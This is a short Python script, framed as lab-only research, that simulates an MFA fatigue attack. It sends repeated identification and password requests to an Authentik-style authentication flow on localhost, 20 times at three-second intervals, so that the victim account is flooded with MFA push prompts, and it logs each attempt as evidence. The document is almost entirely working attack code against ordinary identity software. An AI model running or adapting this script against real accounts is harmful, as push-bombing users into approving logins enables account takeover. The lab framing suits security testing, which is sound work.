#!/usr/bin/env python3
"""
MFA Fatigue simulation script.
FOR RESEARCH USE IN CONTROLLED LAB ONLY.
"""

import requests
import time
import json
from datetime import datetime

TARGET        = "http://localhost:9000"
USERNAME      = "victim@test.com"
PASSWORD      = "Password123!"
ATTEMPT_COUNT = 20
DELAY_SECONDS = 3

log = []

def attempt_auth(n):
    ts = datetime.now().isoformat()
    try:
        session = requests.Session()
        r = session.post(
            f"{TARGET}/api/v3/flows/executor/default-authentication-flow/",
            json={"component": "ak-stage-identification", "uid_field": USERNAME},
            timeout=5
        )
        r2 = session.post(
            f"{TARGET}/api/v3/flows/executor/default-authentication-flow/",
            json={"component": "ak-stage-password", "password": PASSWORD},
            timeout=5
        )
        status = r2.status_code
        log.append({"attempt": n, "timestamp": ts, "status": status})
        print(f"[{ts}] Attempt {n:02d} — HTTP {status}")
    except Exception as e:
        log.append({"attempt": n, "timestamp": ts, "error": str(e)})
        print(f"[{ts}] Attempt {n:02d} — ERROR: {e}")

print(f"Starting MFA fatigue simulation — {ATTEMPT_COUNT} attempts, {DELAY_SECONDS}s apart")
print("=" * 60)

for i in range(1, ATTEMPT_COUNT + 1):
    attempt_auth(i)
    if i < ATTEMPT_COUNT:
        time.sleep(DELAY_SECONDS)

with open("evidence/flood-log.json", "w") as f:
    json.dump(log, f, indent=2)

print("\nEvidence saved to evidence/flood-log.json")
